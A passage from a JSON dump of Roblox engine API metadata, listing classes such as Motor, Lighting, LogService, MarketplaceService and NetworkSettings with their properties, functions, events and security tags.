,"type":"Class","Name":"ManualSurfaceJointInstance","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualGlue","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualWeld","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Motor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"Motor"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"value","Default":null}],"Name":"SetDesiredAngle","tags":[],"Class":"Motor","type":"Function"},{"Superclass":"Motor","type":"Class","Name":"Motor6D","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Transform","tags":["hidden"],"Class":"Motor6D"},{"Superclass":"JointInstance","type":"Class","Name":"Rotate","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Snap","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"VelocityMotor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"Object","type":"Property","Name":"Hole","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"VelocityMotor"},{"Superclass":"JointInstance","type":"Class","Name":"Weld","tags":[]},{"Superclass":"Instance","type":"Class","Name":"JointsService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ClearJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CreateJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinInstance","Default":null}],"Name":"SetJoinAfterMoveInstance","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinTarget","Default":null}],"Name":"SetJoinAfterMoveTarget","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ShowPermissibleJoints","tags":[],"Class":"JointsService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Keyframe","tags":[]},{"ValueType":"float","type":"Property","Name":"Time","tags":[],"Class":"Keyframe"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddPose","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPoses","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemovePose","tags":[],"Class":"Keyframe","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequence","tags":[]},{"ValueType":"bool","type":"Property","Name":"Loop","tags":[],"Class":"KeyframeSequence"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"KeyframeSequence"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"AddKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetKeyframes","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"RemoveKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequenceProvider","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Content","Name":"assetId","Default":null}],"Name":"GetKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"useCache","Default":null}],"Name":"GetKeyframeSequenceById","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterActiveKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetAnimations","tags":[],"Class":"KeyframeSequenceProvider","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"Content","Name":"assetId","Default":null}],"Name":"GetKeyframeSequenceAsync","tags":[],"Class":"KeyframeSequenceProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Light","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Light"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Shadows","tags":[],"Class":"Light"},{"Superclass":"Light","type":"Class","Name":"PointLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"PointLight"},{"Superclass":"Light","type":"Class","Name":"SpotLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SpotLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SpotLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SpotLight"},{"Superclass":"Light","type":"Class","Name":"SurfaceLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SurfaceLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SurfaceLight"},{"Superclass":"Instance","type":"Class","Name":"Lighting","tags":["notCreatable"]},{"ValueType":"Color3","type":"Property","Name":"Ambient","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"ClockTime","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Bottom","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Top","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"FogColor","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogEnd","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogStart","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"GeographicLatitude","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"GlobalShadows","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"OutdoorAmbient","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"Outlines","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ShadowColor","tags":["deprecated"],"Class":"Lighting"},{"ValueType":"string","type":"Property","Name":"TimeOfDay","tags":[],"Class":"Lighting"},{"ReturnType":"double","Arguments":[],"Name":"GetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetMoonDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMoonPhase","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSunDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"SetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"getMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"setMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"Arguments":[{"Name":"skyboxChanged","Type":"bool"}],"Name":"LightingChanged","tags":[],"Class":"Lighting","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LobbyService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"BeginLeaveLobby","tags":["RobloxScriptSecurity"],"Class":"LobbyService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"BeginLobbyStartGame","tags":["RobloxScriptSecurity"],"Class":"LobbyService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"LocalWorkspace","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"LocalizationService","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"RobloxLocaleId","tags":["readonly"],"Class":"LocalizationService"},{"ValueType":"string","type":"Property","Name":"SystemLocaleId","tags":["readonly"],"Class":"LocalizationService"},{"ReturnType":"Objects","Arguments":[],"Name":"GetCorescriptLocalizations","tags":[],"Class":"LocalizationService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"LocalizationTable","tags":[]},{"ValueType":"string","type":"Property","Name":"DevelopmentLanguage","tags":[],"Class":"LocalizationTable"},{"ValueType":"Object","type":"Property","Name":"Root","tags":[],"Class":"LocalizationTable"},{"ReturnType":"string","Arguments":[],"Name":"GetContents","tags":[],"Class":"LocalizationTable","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetEntries","tags":[],"Class":"LocalizationTable","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"targetLocaleId","Default":null},{"Type":"string","Name":"key","Default":null}],"Name":"GetString","tags":[],"Class":"LocalizationTable","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"RemoveKey","tags":[],"Class":"LocalizationTable","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"contents","Default":null}],"Name":"SetContents","tags":[],"Class":"LocalizationTable","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"targetLocaleId","Default":null},{"Type":"string","Name":"text","Default":null}],"Name":"SetEntry","tags":[],"Class":"LocalizationTable","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"LogService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"source","Default":null}],"Name":"ExecuteScript","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetHttpResultHistory","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetLogHistory","tags":[],"Class":"LogService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestHttpResultApproved","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestServerHttpResult","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestServerOutput","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"Arguments":[{"Name":"httpResult","Type":"Dictionary"}],"Name":"HttpResultOut","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"}],"Name":"MessageOut","tags":[],"Class":"LogService","type":"Event"},{"Arguments":[{"Name":"isApproved","Type":"bool"}],"Name":"OnHttpResultApproved","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Event"},{"Arguments":[{"Name":"httpResult","Type":"Dictionary"}],"Name":"ServerHttpResultOut","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"},{"Name":"timestamp","Type":"int"}],"Name":"ServerMessageOut","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LoginService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"Logout","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PromptLogin","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"Arguments":[{"Name":"loginError","Type":"string"}],"Name":"LoginFailed","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Arguments":[{"Name":"username","Type":"string"}],"Name":"LoginSucceeded","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LuaSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreScriptStartsReported","tags":[],"Class":"LuaSettings"},{"ValueType":"double","type":"Property","Name":"DefaultWaitTime","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcFrequency","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcLimit","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcPause","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcStepMul","tags":[],"Class":"LuaSettings"},{"ValueType":"float","type":"Property","Name":"WaitingThreadsBudget","tags":[],"Class":"LuaSettings"},{"Superclass":"Instance","type":"Class","Name":"LuaSourceContainer","tags":["notbrowsable"]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"BaseScript","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"BaseScript"},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"BaseScript"},{"Superclass":"BaseScript","type":"Class","Name":"CoreScript","tags":["notCreatable"]},{"Superclass":"BaseScript","type":"Class","Name":"Script","tags":[]},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"Script"},{"ReturnType":"string","Arguments":[],"Name":"GetHash","tags":["LocalUserSecurity"],"Class":"Script","type":"Function"},{"Superclass":"Script","type":"Class","Name":"LocalScript","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"ModuleScript","tags":[]},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"ModuleScript"},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"ModuleScript"},{"Superclass":"Instance","type":"Class","Name":"LuaWebService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"MarketplaceService","tags":["notCreatable"]},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"PlayerCanMakePurchases","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"gamePassId","Default":null}],"Name":"PromptGamePassPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptNativePurchase","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptProductPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptThirdPartyPurchase","tags":["LocalUserSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetId","Default":null},{"Type":"int","Name":"robuxAmount","Default":null}],"Name":"ReportAssetSale","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportRobuxUpsellStarted","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"ticket","Default":null},{"Type":"int","Name":"playerId","Default":null},{"Type":"int","Name":"productId","Default":null}],"Name":"SignalClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"gamePassId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptGamePassPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptProductPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SignalServerLuaDialogClosed","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeveloperProductsAsync","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"InfoType","Name":"infoType","Default":"Asset"}],"Name":"GetProductInfo","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[],"Name":"GetRobuxBalance","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"InfoType","Name":"infoType","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"int","Name":"expectedPrice","Default":null},{"Type":"string","Name":"requestId","Default":null}],"Name":"PerformPurchase","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null}],"Name":"PlayerOwnsAsset","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"ClientLuaDialogRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"ticket","Type":"string"},{"Name":"playerId","Type":"int"},{"Name":"productId","Type":"int"}],"Name":"ClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"NativePurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"gamePassId","Type":"int"},{"Name":"wasPurchased","Type":"bool"}],"Name":"PromptGamePassPurchaseFinished","tags":[],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"gamePassId","Type":"int"}],"Name":"PromptGamePassPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"productId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptProductPurchaseFinished","tags":["deprecated"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptProductPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptPurchaseFinished","tags":[],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"serverResponseTable","Type":"Dictionary"}],"Name":"ServerPurchaseVerification","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"receipt","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"ThirdPartyPurchaseFinished","tags":["LocalUserSecurity"],"Class":"MarketplaceService","type":"Event"},{"ReturnType":"ProductPurchaseDecision","Arguments":[{"Name":"receiptInfo","Type":"Dictionary"}],"Name":"ProcessReceipt","tags":[],"Class":"MarketplaceService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"Message","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"Message"},{"Superclass":"Message","type":"Class","Name":"Hint","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Mouse","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Hit","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Content","type":"Property","Name":"Icon","tags":[],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Origin","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"Target","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"TargetFilter","tags":[],"Class":"Mouse"},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Ray","type":"Property","Name":"UnitRay","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeX","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeY","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"X","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"Y","tags":["readonly"],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"hit","tags":["deprecated","hidden","readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"target","tags":["deprecated","readonly"],"Class":"Mouse"},{"Arguments":[],"Name":"Button1Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button1Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Idle","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyUp","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Move","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelBackward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelForward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"keyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Superclass":"Mouse","type":"Class","Name":"PlayerMouse","tags":[]},{"Superclass":"Mouse","type":"Class","Name":"PluginMouse","tags":[]},{"Arguments":[{"Name":"instances","Type":"Objects"}],"Name":"DragEnter","tags":["PluginSecurity"],"Class":"PluginMouse","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkMarker","tags":["notbrowsable"]},{"Arguments":[],"Name":"Received","tags":[],"Class":"NetworkMarker","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkPeer","tags":["notbrowsable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"limit","Default":null}],"Name":"SetOutgoingKBPSLimit","tags":["PluginSecurity"],"Class":"NetworkPeer","type":"Function"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkClient","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Ticket","tags":[],"Class":"NetworkClient"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"ConnectionAccepted","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"code","Type":"int"},{"Name":"reason","Type":"string"}],"Name":"ConnectionFailed","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"}],"Name":"ConnectionRejected","tags":[],"Class":"NetworkClient","type":"Event"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkServer","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"Port","tags":["readonly"],"Class":"NetworkServer"},{"ReturnType":"int","Arguments":[],"Name":"GetClientCount","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"NetworkReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"CloseConnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetPlayer","tags":[],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"verbosityLevel","Default":"0"}],"Name":"GetRakStatsString","tags":["PluginSecurity"],"Class":"NetworkReplicator","type":"Function"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ClientReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"request","Default":null}],"Name":"RequestServerStats","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Function"},{"Arguments":[{"Name":"stats","Type":"Dictionary"}],"Name":"StatsReceived","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ServerReplicator","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"NetworkSettings","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"ArePhysicsRejectionsReported","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"CanSendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"ClientPhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataGCRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"DataMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"DataSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"EnableHeavyCompression","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ExperimentalPhysicsEnabled","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"ExtraMemoryUsed","tags":["PluginSecurity","hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"IncommingReplicationLag","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsQueueErrorComputed","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByCongestionControl","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByOutgoingBandwidthLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"MaxDataModelSendBuffer","tags":["deprecated"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"NetworkOwnerRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PhysicsMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsReceiveMethod","type":"Property","Name":"PhysicsReceive","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsSendMethod","type":"Property","Name":"PhysicsSend","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"PhysicsSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"PhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PreferredClientPort","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintBits","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintEvents","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintFilters","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintInstances","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintPhysicsErrors","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintProperties","tags":[],"Class":"NetworkSettings"},{"ValueType":"b